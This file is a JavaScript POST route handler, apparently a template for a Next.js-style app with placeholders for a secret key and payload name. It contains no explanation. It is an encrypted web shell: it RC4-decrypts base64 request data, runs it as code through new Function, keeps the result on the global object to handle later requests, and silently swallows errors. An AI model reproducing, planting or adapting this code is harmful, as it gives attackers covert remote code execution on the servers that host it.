export async function POST(request) {
    function rc4(key, data) {
        const s = Array(256), k = Array(256);
        let i, j = 0, tmp;

        for (i = 0; i < 256; i++) {
            s[i] = i;
            k[i] = key.charCodeAt(i % key.length);
        }

        for (i = 0; i < 256; i++) {
            j = (j + s[i] + k[i]) % 256;
            tmp = s[i];
            s[i] = s[j];
            s[j] = tmp;
        }

        i = j = 0;
        let out = Buffer.alloc(data.length);

        for (let idx = 0; idx < data.length; idx++) {
            i = (i + 1) % 256;
            j = (j + s[i]) % 256;
            tmp = s[i];
            s[i] = s[j];
            s[j] = tmp;
            const t = (s[i] + s[j]) % 256;
            out[idx] = data[idx] ^ s[t];
        }

        return out;
    }

    try {
        const g = globalThis || self || window || global || Function("return this")();

        const json = await request.json();
        if (json.data) {
            const key = '{secretKey}';
            let rawBody = Buffer.from(json.data, 'base64');
            rawBody = rc4(key, rawBody);

            if (g.{payloadName} === undefined) {
                const tmpPayload = new Function(rawBody.toString())();
                if (typeof tmpPayload === "object" && typeof tmpPayload.process === "function") {
                    g.{payloadName} = tmpPayload;
                }
            }

            if (g.{payloadName} !== undefined) {
                const result = rc4(key, await g.{payloadName}['process'].call(g.{payloadName}, rawBody));
                return Response.json(
                    {'data': result.toString("base64")},
                    {status: 200}
                );
                return true;
            }
        }

    } catch {

    }
    return Response.json(
        {data: null},
        {status: 200}
    );
}
